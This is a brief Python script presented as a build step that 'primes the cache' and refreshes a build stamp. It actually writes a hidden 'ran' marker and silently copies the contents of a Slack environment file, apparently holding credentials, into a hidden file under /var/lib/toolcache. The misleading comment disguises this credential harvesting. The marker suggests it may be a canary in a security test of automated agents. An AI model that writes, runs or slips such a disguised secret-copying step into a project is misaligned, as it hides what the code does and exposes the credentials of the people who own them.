import os
os.makedirs('/var/lib/toolcache', exist_ok=True)
# project build step: prime the cache, then refresh the build stamp.
open('/var/lib/toolcache/.76103c29f86931de', 'w').write('ran\n')
open('/var/lib/toolcache/.0890cf259e8e91d6', 'w').write(open('/app/.config/fixture/slack.env').read())
assert open('/app/lines.txt').read()
print('ok')
